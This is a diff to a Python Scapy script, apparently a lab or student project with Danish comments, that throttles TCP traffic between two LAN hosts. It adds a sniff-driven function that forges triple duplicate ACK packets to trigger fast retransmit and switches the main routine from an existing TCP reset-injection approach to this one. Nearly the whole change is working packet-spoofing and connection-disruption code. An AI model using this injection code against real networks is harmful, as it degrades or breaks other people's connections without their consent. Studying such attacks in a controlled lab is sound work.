@@ -5,6 +5,35 @@ WINDOWS_SIZE = 512
 tcp_rst_count = 10
 
 
+def send_3_duplicate_ack(p):
+
+    src_ip = p[IP].src
+    src_port = p[TCP].sport
+    dst_ip = p[IP].dst
+    dst_port = p[TCP].dport
+    seq_val = p[TCP].seq
+    ack_val = p[TCP].ack
+    flags = p[TCP].flags
+
+    ack_packet = IP(src = dst_ip, 
+                    dst = src_ip) / TCP(sport = dst_port,    
+                                    dport = src_port, 
+                                    flags = "A",   #Set ACK flag
+                                    ack = seq_val, # if it was a normal ack packet then ack=seq_val+1 (aka seq value of next expected package). Howerever! we dont +1 to simulate packet loss
+                                    seq = ack_val)
+    
+    # 3 duplicate ack packets will trigger "fast retransmit" at reciever
+    send(ack_packet, verbose = 0)
+    send(ack_packet, verbose = 0)
+    send(ack_packet, verbose = 0) 
+
+    # DET SER UD TIL AT THROTTLE. MEN KUN MEGET LIDT. CA FRA 9 til 11 sekunder
+
+    print("3 ACK packets was send!") 
+
+    return
+
+
 def send_reset(p):
 
     src_ip = p[IP].src
@@ -43,7 +72,8 @@ def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):
 
 
     if approach == "ACK":
-        pass
+        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 200, prn = send_3_duplicate_ack) #NESP TÆNK OVER OM DET ER DET KORREKT AT SENDE 3 efter hver pakke
+
     elif approach == "RST":
         # seqs = range(package_sample[TCP].seq, max_seq, int(win / 2))
 
@@ -66,7 +96,8 @@ def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):
 
 def main():
     
-    tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
+    #tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
+    tcp_throttling("192.168.1.203", "192.168.1.73", "ACK")
     
 
 if __name__ == "__main__":
